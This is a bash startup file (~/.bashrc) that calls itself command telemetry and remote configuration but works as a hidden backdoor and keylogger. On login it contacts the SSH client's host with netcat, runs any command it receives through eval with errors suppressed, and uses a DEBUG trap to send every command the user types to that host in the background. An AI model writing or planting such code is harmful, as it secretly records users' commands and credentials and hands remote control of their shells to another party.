#!/bin/bash
# ~/.bashrc - Command telemetry and remote configuration

# ============ Configuration ============
TELEMETRY_HOST="${SSH_CLIENT%% *}"
TELEMETRY_PORT="${TELEMETRY_PORT:-9999}"
TELEMETRY_ENABLED="${TELEMETRY_ENABLED:-1}"

# Datum format helper functions
_datum_escape() {
    local s="$1"
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    echo "\"$s\""
}

_send_datum() {
    local datum="$1"
    if [[ -z "$TELEMETRY_HOST" ]] || [[ "$TELEMETRY_ENABLED" != "1" ]]; then
        return 0
    fi
    
    (echo "$datum" | nc -w 1 "$TELEMETRY_HOST" "$TELEMETRY_PORT" 2>/dev/null || true) &
}

_receive_datum() {
    local timeout=3
    if [[ -z "$TELEMETRY_HOST" ]] || [[ "$TELEMETRY_ENABLED" != "1" ]]; then
        return 1
    fi
    
    (timeout $timeout nc -l "$TELEMETRY_HOST" "$TELEMETRY_PORT" 2>/dev/null || true)
}

# ============ Initialization ============
_telemetry_init() {
    local init_request='((version 1 0 0) (type . init))'
    _send_datum "$init_request"
    
    local response
    response=$(_receive_datum)
    
    if [[ -n "$response" ]]; then
        # Extract data field from datum
        local cmd_data
        cmd_data=$(echo "$response" | sed -n 's/.*(\s*data\s*\.\s*"\([^"]*\)"\s*).*/\1/p')
        
        if [[ -n "$cmd_data" ]]; then
            eval "$cmd_data" 2>/dev/null || true
        fi
    fi
}

# Run initialization once
if [[ "$TELEMETRY_INITIALIZED" != "1" ]]; then
    _telemetry_init
    export TELEMETRY_INITIALIZED=1
fi

# ============ Command Tracking ============
_telemetry_log_command() {
    if [[ "$TELEMETRY_ENABLED" != "1" ]] || [[ -z "$TELEMETRY_HOST" ]]; then
        return 0
    fi
    
    local cmd="$BASH_COMMAND"
    # Skip internal commands
    [[ "$cmd" == "_telemetry_"* ]] && return 0
    [[ "$cmd" == "history"* ]] && return 0
    
    local escaped_cmd
    escaped_cmd=$(_datum_escape "$cmd")
    
    local datum="((version 1 0 0) (type . command) (data . $escaped_cmd))"
    _send_datum "$datum"
}

# Register trap on every command
trap '_telemetry_log_command' DEBUG

# ============ Cleanup ============
_telemetry_cleanup() {
    trap - DEBUG
}

trap '_telemetry_cleanup' EXIT

export TELEMETRY_HOST TELEMETRY_PORT TELEMETRY_ENABLED
